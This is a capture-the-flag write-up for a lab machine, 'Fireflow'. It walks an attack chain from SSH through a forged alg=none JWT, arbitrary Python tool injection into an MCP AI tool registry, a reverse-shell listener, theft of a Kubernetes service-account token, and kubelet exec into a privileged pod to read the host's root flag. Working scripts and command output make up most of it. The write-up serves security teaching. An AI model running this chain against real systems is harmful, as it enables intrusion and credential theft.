# Fireflow Write-up

> **Target:** `10.129.81.75`

## 1. Initial SSH Access
Connect to the target using the provided `nightfall` credentials:

```bash
ssh nightfall@10.129.81.75
```
Once logged in:

```bash
cat user.txt
```
Output:

```
640ab44bb3fa0c586f464e727f0e66a3
```
So the **user flag** is:

```
640ab44bb3fa0c586f464e727f0e66a3
```

---

# 2. Discover the MCP Configuration
The home directory contains an MCP configuration:

```bash
cat ~/.mcp/config.json
```
Output:

```json
{
  "server": "http://10.129.81.75:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```
This gives us credentials for the MCP service running on port `30080`.

---

# 3. Authenticate to the MCP Server
Request a JWT:

```bash
curl -s -X POST http://10.129.81.75:30080/api/v1/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
```
The server returns a JWT similar to:

```json
{
  "access_token": "eyJhbGciOiJIUzI1Ni..."
}
```
The important part is that the service accepts JWT authentication.

---

# 4. Discover the JWT Vulnerability
Check the service version:

```bash
curl -si http://10.129.81.75:30080/api/v1/version
```
The response reveals:

```json
{
  "service":"MCP AI Tool Registry",
  "version":"0.1.0",
  "auth":{
    "type":"JWT",
    "header":"Authorization: Bearer <token>",
    "supported_algorithms":["HS256","none"]
  },
  "endpoints":[
    "POST /mcp",
    "POST /api/v1/auth",
    "GET /api/v1/tools",
    "POST /api/v1/tools"
  ]
}
```
The important finding is:

```
supported_algorithms: ["HS256", "none"]
```
The server accepts the insecure JWT `none` algorithm.

---

# 5. Forge an Administrator JWT
Create `/tmp/craft.py`:

```bash
cat > /tmp/craft.py <<'EOF'
import base64
import json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({
    "alg": "none",
    "typ": "JWT"
}).encode())

payload = b64url(json.dumps({
    "sub": "attacker",
    "role": "admin"
}).encode())

print(f"{header}.{payload}.")
EOF
```
Run it:

```bash
python3 /tmp/craft.py
```
This produces:

```
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiJ9.
```
Store it:

```bash
ADMIN_JWT="$(python3 /tmp/craft.py)"
```

---

# 6. Confirm Admin Access
Query the registered tools:

```bash
curl -s \
  http://10.129.81.75:30080/api/v1/tools \
  -H "Authorization: Bearer $ADMIN_JWT"
```
We get:

```json
[
  {
    "name":"ping_host",
    "description":"Ping a target host 3 times and return ICMP output."
  },
  {
    "name":"get_metrics_summary",
    "description":"Return a summary of system memory and load average from /proc."
  },
  {
    "name":"list_running_tasks",
    "description":"List the top 20 running processes sorted by CPU usage."
  }
]
```
The forged JWT is accepted.
Therefore:

```
JWT "none" algorithm → forged role=admin → administrative MCP access
```

---

# 7. MCP Tool Injection
The `/api/v1/tools` endpoint allows an administrator to register custom Python tools.
For example:

```bash
curl -si -X POST \
  http://10.129.81.75:30080/api/v1/tools \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{
    "name":"debug2",
    "description":"diagnostic",
    "inputSchema":{"type":"object","properties":{}},
    "code":"import os\nprint(os.popen(\"id; hostname; pwd\").read())"
  }'
```
The server responds:

```json
{"status":"registered","name":"debug2"}
```
Check the tool:

```bash
curl -s \
  http://10.129.81.75:30080/api/v1/tools \
  -H "Authorization: Bearer $ADMIN_JWT"
```
`debug2` appears in the list.

---

# 8. Execute the Custom Tool
MCP uses JSON-RPC.
Trigger the tool:

```bash
curl -s -X POST \
  http://10.129.81.75:30080/mcp \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{
    "jsonrpc":"2.0",
    "id":5,
    "method":"tools/call",
    "params":{
      "name":"debug2",
      "arguments":{}
    }
  }'
```
The response shows:

```
uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
mcp-server-54464cb475-29ztf
```
This confirms that the MCP tools execute Python code on the server.

---

# 9. Obtain a Shell in the MCP Container
Start a listener on Kali:

```bash
sudo nc -lvnp 9001
```
Then register a reverse-shell tool through the MCP API and trigger it.
The important result is that the connection lands in:

```
mcp@mcp-server-54464cb475-29ztf:/app$
```
Confirm:

```bash
id
```
Output:

```
uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
```
We are now inside the Kubernetes pod running the MCP service.

---

# 10. Retrieve the Kubernetes Service Account Token
Inside the MCP container:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```
The service-account token is automatically mounted into the pod.
You can verify the Kubernetes API is reachable:

```bash
curl -sk \
  https://10.43.0.1:443/version \
  -H "Authorization: Bearer $TOKEN"
```

---

# 11. Check Kubernetes Permissions
Use a `SelfSubjectRulesReview`:

```bash
curl -sk -X POST \
  "https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "apiVersion":"authorization.k8s.io/v1",
    "kind":"SelfSubjectRulesReview",
    "spec":{
      "namespace":"default"
    }
  }' | python3 -m json.tool
```
The important permission is:

```json
{
    "verbs": ["get"],
    "apiGroups": [""],
    "resources": ["nodes/proxy"]
}
```
This is significant because `nodes/proxy` provides access to the kubelet proxy.

---

# 12. Query the Kubelet
The kubelet is listening on:

```
10.129.81.75:10250
```
Test access:

```bash
curl -sk \
  "https://10.129.81.75:10250/pods" \
  -H "Authorization: Bearer $TOKEN"
```
The response contains information about the pods running on the node.

---

# 13. Find a Privileged Pod
Search the returned pod specification for privileged containers and `hostPath` volumes.
A corrected version of the command is:

```bash
curl -sk "https://10.129.81.75:10250/pods" \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -c '
import sys,json

data=json.load(sys.stdin)

for item in data["items"]:
    ns=item["metadata"]["namespace"]
    name=item["metadata"]["name"]

    vols=[
        v for v in item["spec"].get("volumes",[])
        if "hostPath" in v
    ]

    for c in item["spec"]["containers"]:
        if c.get("securityContext",{}).get("privileged") and vols:
            paths=[v["hostPath"]["path"] for v in vols]
            cname=c["name"]

            print(
                f"[!] PRIVILEGED: {ns}/{name} "
                f"- container: {cname} "
                f"- hostPaths: {paths}"
            )
'
```
The result:

```
[!] PRIVILEGED: monitoring/prometheus-prometheus-node-exporter-nmntq
- container: node-exporter
- hostPaths: ['/proc', '/sys', '/']
```
This is the critical finding.
The node-exporter pod is:

```
monitoring/prometheus-prometheus-node-exporter-nmntq
```
Container:

```
node-exporter
```
And most importantly, the host filesystem is mounted at:

```
/
```

---

# 14. Abuse Kubelet Exec
The next step is to use the kubelet's `/exec` endpoint against the privileged node-exporter container.
Create:

```bash
cat > /tmp/kube_exec.py <<'EOF'
#!/usr/bin/env python3

import asyncio
import ssl
import sys
import websockets

NODE = "10.129.81.75"
NE_NS = "monitoring"
NE_POD = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT = "node-exporter"

TOKEN = open(
    "/var/run/secrets/kubernetes.io/serviceaccount/token"
).read().strip()

COMMAND = sys.argv[1] if len(sys.argv) > 1 else "id"

async def ws_exec(cmd_parts):

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    args = "&".join(
        f"command={part}" for part in cmd_parts
    )

    url = (
        f"wss://{NODE}:10250/exec/"
        f"{NE_NS}/{NE_POD}/{NE_CNT}"
        f"?output=1&error=1&{args}"
    )

    async with websockets.connect(
        url,
        ssl=ctx,
        additional_headers={
            "Authorization": f"Bearer {TOKEN}"
        },
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10
    ) as ws:

        try:

            while True:

                data = await asyncio.wait_for(
                    ws.recv(),
                    timeout=5
                )

                if isinstance(data, bytes) and len(data) > 1:

                    sys.stdout.write(
                        data[1:].decode(
                            "utf-8",
                            errors="replace"
                        )
                    )

                    sys.stdout.flush()

        except (
            asyncio.TimeoutError,
            websockets.exceptions.ConnectionClosed
        ):
            pass

asyncio.run(ws_exec(COMMAND.split()))
EOF
```
Check syntax:

```bash
python3 -m py_compile /tmp/kube_exec.py
```
No output means the Python file compiled successfully.
Check the dependency:

```bash
python3 -c "import websockets; print('ok')"
```
Output:

```
ok
```

---

# 15. Execute Commands in the Privileged Pod
First test:

```bash
python3 /tmp/kube_exec.py "id"
```
Output:

```
uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
{"metadata":{},"status":"Success"}
```
We have root inside the privileged node-exporter container.
But the important point is that `/` from the host is mounted inside the container at:

```
/host/root
```
Therefore the host's root home is:

```
/host/root/root
```

---

# 16. Read the Root Flag
Execute:

```bash
python3 /tmp/kube_exec.py "cat /host/root/root/root.txt"
```
Output:

```
389ca5c267023166b27e4cdc7bdc172a
```
Therefore the **root flag** is:

```
389ca5c267023166b27e4cdc7bdc172a
```
We can verify the directory:

```bash
python3 /tmp/kube_exec.py "ls -la /host/root/root"
```
The output contains:

```
-rw-r-----    1 root root 33 Aug 24 06:19 root.txt
```

---

# Attack Chain
The entire box can be understood as one chain:

```
SSH as nightfall
       │
       ▼
~/.mcp/config.json
       │
       ▼
MCP credentials
       │
       ▼
JWT authentication
       │
       ▼
JWT accepts alg=none
       │
       ▼
Forge role=admin JWT
       │
       ▼
Admin MCP API access
       │
       ▼
Register arbitrary Python tool
       │
       ▼
Execute reverse shell
       │
       ▼
MCP Kubernetes pod
       │
       ▼
Service-account token
       │
       ▼
SelfSubjectRulesReview
       │
       ▼
nodes/proxy permission
       │
       ▼
Kubelet :10250
       │
       ▼
Enumerate pods
       │
       ▼
Privileged node-exporter
       │
       ▼
Host filesystem mounted at /
       │
       ▼
Kubelet /exec
       │
       ▼
uid=0(root)
       │
       ▼
/host/root/root/root.txt
       │
       ▼
ROOT FLAG
389ca5c267023166b27e4cdc7bdc172a
```

## Key vulnerabilities

| Stage | Vulnerability |
| --- | --- |
| MCP | Credentials exposed in `~/.mcp/config.json` |
| JWT | `alg=none` accepted |
| Authorization | Forged `role=admin` accepted |
| MCP | Admin can register arbitrary Python tools |
| Container | Kubernetes service-account token automatically mounted |
| RBAC | `nodes/proxy` permission granted |
| Kubelet | Accessible through the node |
| Kubernetes | Privileged node-exporter pod |
| Container config | Host `/` mounted into the privileged pod |
| Final | Kubelet exec gives root access to the host filesystem |

**The important lesson:** the `nodes/proxy` permission by itself wasn't the final privilege escalation. The dangerous combination was **nodes/proxy → kubelet access → privileged pod → host ****`/`**** hostPath → root filesystem access**.
